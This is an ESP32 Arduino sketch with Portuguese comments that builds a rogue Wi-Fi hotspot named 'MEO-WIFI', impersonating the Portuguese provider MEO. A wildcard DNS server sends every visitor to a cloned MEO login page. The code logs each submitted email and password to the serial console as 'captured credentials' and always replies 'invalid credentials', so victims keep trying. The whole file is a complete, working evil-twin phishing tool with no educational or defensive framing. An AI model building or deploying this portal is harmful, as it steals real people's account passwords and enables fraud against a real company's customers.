#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

//Nome da rede
const char* ssid = "MEO-WIFI";
//pass da rede
const char* password = "";

const byte DNS_PORT = 53; 
IPAddress apIP(192, 168, 4, 1); 

//servidor DNS e HTTP
DNSServer dnsServer;
WebServer server(80);

// Página web
String getLoginPage(const String& errorMessage = "") {
  String page = R"rawliteral(
<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MEO-WIFI Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: #fff;
      border-radius: 10px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
      width: 90%;
      max-width: 400px;
      padding: 20px;
      text-align: center;
    }
    .container h1 {
      color: #0073e6;
      margin-bottom: 10px;
    }
    .container p {
      font-size: 14px;
      color: #555;
    }
    .error {
      color: red;
      font-size: 14px;
      margin-bottom: 15px;
    }
    form {
      margin-top: 20px;
    }
    label {
      font-size: 14px;
      display: block;
      margin-bottom: 5px;
      text-align: left;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 14px;
    }
    input[type="submit"] {
      background-color: #0073e6;
      color: #fff;
      border: none;
      padding: 10px 20px;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
      width: 100%;
    }
    input[type="submit"]:hover {
      background-color: #005bb5;
    }
    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #999;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>MEO-WIFI</h1>
    <p>Bem-vindo ao serviço MEO-WIFI. Por favor, introduza as suas credenciais para continuar.</p>
)rawliteral";

  
  if (!errorMessage.isEmpty()) {
    page += "<div class='error'>" + errorMessage + "</div>";
  }

  page += R"rawliteral(
    <form action="/login" method="POST">
      <label for="username">Email:</label>
      <input type="text" id="username" name="username" placeholder="Introduza o seu email" required>
      <label for="password">Palavra-Passe:</label>
      <input type="password" id="password" name="password" placeholder="Introduza a sua palavra-passe" required>
      <input type="submit" value="Iniciar Sessão">
    </form>
    <div class="footer">© 2025 MEO. Todos os direitos reservados.</div>
  </div>
</body>
</html>
)rawliteral";

  return page;
}


// Captura
void handleLogin() {
  if (server.hasArg("username") && server.hasArg("password")) {
    String username = server.arg("username");
    String password = server.arg("password");
    Serial.println("Credenciais capturadas:");
    Serial.println("Utilizador: " + username);
    Serial.println("palavra-Passe: " + password);

    String errorPage = getLoginPage("Erro: Credenciais inválidas. Por favor, tente novamente.");
    server.send(200, "text/html", errorPage);
  } else {
    server.send(400, "text/html", "<h1>Erro: Dados incompletos.</h1>");
  }
}

// Página principal
void handleRoot() {
  server.send(200, "text/html", getLoginPage());
}

void setup() {
  Serial.begin(115200);

  // Configuração do AP
  WiFi.softAP(ssid, password);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  Serial.println("Ponto de acesso criado com sucesso!");
  Serial.println(WiFi.softAPIP());

  //DNS
  dnsServer.start(DNS_PORT, "*", apIP);

  // rotas HTTP
  server.on("/", HTTP_GET, handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.onNotFound(handleRoot);

  server.begin();
}

void loop() {
  //pedidos DNS
  dnsServer.processNextRequest(); 
  //pedidos HTTP
  server.handleClient();   
}
